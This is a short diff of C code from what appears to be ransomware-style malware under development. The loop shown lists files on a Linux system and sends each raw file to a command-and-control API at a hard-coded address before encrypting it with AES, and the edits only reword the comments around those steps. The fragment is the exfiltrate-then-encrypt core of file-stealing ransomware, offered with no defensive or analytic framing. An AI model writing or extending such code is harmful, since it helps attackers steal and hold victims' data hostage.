@@ -36,10 +36,10 @@ int main(){
     initPathList(&pathList);
 
     linuxListFiles(path, &pathList);
-
+    //Browse files
     for (size_t i = 0; i < pathList.count; ++i) {
         //printf("%s\n", pathList.paths[i]); Debug
-        //Send the raw files to C2
+        //Send the raw file to C2
         sendFileToApi(pathList.paths[i], "https://192.168.0.1/path/to/file/api");
 
         //Encrypt each file with AES
